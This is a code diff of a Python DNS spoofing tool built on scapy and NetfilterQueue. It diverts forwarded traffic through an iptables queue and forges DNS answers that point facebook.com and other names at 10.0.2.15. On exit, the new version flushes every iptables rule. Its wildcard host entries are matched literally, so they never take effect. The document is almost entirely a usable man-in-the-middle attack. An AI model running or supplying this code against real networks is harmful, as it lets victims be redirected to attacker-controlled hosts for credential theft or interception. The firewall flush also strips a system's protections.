@@ -1,23 +1,52 @@
-import os
-import logging as log
-from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
+#importing modules
+import scapy.all as scapy
 from netfilterqueue import NetfilterQueue
- 
- 
-class DnsSnoof:
-    def __init__(self, hostDict, queueNum):
-        self.hostDict = hostDict
-        self.queueNum = queueNum
-        self.queue = NetfilterQueue()
- 
-    def __call__(self):
-        log.info("Snoofing....")
-        os.system(
-            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-        self.queue.bind(self.queueNum, self.callBack)
+import os
+
+# creating dictionary
+hosts = {
+    b"www.*.": "10.0.2.15",
+    b"*.com": "10.0.2.15",
+    b"facebook.com.": "10.0.2.15"
+}
+
+#function for handling user input
+def pkt_process(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+
+        print("[Before Modification ]:", scapy_packet.summary())
         try:
-            self.queue.run()
-        except KeyboardInterrupt:
-            os.system(
-                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-            log.info("[!] iptable rule flushed")
+            scapy_packet = modify_packet(scapy_packet)
+        except IndexError:
+            pass
+        print("[After Modification ]:", scapy_packet.summary())
+        packet.set_payload(bytes(scapy_packet))
+    # accepting packets    
+    packet.accept()
+
+# function for modification of packets
+def modify_packet(packet):
+    qname = packet[scapy.DNSQR].qname
+    if qname not in hosts:
+        print("Invalid DNS Host:", qname)
+        return packet
+    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=hosts[qname])
+    packet[scapy.DNS].ancount = 1
+    
+    #deleting some fields
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.UDP].len
+    del packet[scapy.UDP].chksum
+
+    return packet
+QUEUE_NUM = 123
+# insert the iptables FORWARD rule
+os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+q = NetfilterQueue()
+try:
+    q.bind(QUEUE_NUM, pkt_process)
+    q.run()
+except KeyboardInterrupt:
+    os.system("iptables --flush")
